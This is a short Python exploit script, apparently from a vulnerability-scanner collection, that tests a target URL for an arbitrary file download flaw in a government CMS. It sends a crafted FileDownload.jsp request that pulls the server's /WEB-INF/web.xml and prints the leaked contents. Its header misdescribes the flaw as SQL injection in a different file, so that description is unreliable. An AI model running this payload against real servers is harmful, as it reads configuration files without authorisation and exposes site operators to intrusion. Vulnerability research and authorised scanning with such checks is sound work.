#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 某政府通用任意文件下载
referer: http://www.wooyun.org/bugs/wooyun-2014-068728
author: Lucifer
description: 文件/coupon/s.php中,参数fids存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class zf_cms_FileDownload_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/cms/upload/FileDownload.jsp?id=020010040000092515&filepath=/WEB-INF/web.xml&downloadName=web.xml"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml":
                cprint("[+]存在某政府通用任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
                return True, vulnurl, "某政府通用任意文件下载", payload, req.text
            else:
                cprint("[-]不存在zf_cms_FileDownload漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = zf_cms_FileDownload_BaseVerify(sys.argv[1])
    testVuln.run()